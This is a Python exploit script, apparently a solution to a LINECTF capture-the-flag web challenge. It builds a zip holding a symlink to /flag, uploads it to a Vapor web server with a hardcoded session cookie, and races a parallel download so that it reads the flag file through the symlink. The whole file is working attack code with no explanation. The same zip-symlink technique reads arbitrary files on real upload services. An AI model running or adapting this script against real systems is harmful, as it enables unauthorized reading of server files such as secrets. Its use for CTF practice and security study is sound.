import concurrent.futures
import re
import requests
import subprocess


requests.packages.urllib3.disable_warnings()

s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080"}
s.verify = False

BASE_URL = "http://localhost:11000"
# BASE_URL = "http://34.84.43.130:11000"
s.cookies.update({"vapor_session": "tMj1H1pzcCC+YRkT4Rz6NFcfypk1jZ2ktmTgsvJW5BM="})


def create_symlink():
    subprocess.run(["ln", "-fs", "/flag", "symlink.txt"], check=True)


def zip_with_symlinks():
    subprocess.run(["zip", "--symlinks", "tmp.zip", "symlink.txt"], check=True)


def check_zip():
    subprocess.run(["unzip", "-t", "tmp.zip"], check=True)


def upload():
    s.post(f"{BASE_URL}/upload", files={"data": open("tmp.zip", "rb")})


def download():
    resp = s.get(f"{BASE_URL}/download/symlink.txt")
    if m := re.findall(r"LINECTF", resp.text):
        print(resp.text)


def main():
    create_symlink()
    zip_with_symlinks()
    check_zip()

    for _ in range(100):
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            executor.submit(upload)
            executor.submit(download)


if __name__ == "__main__":
    main()
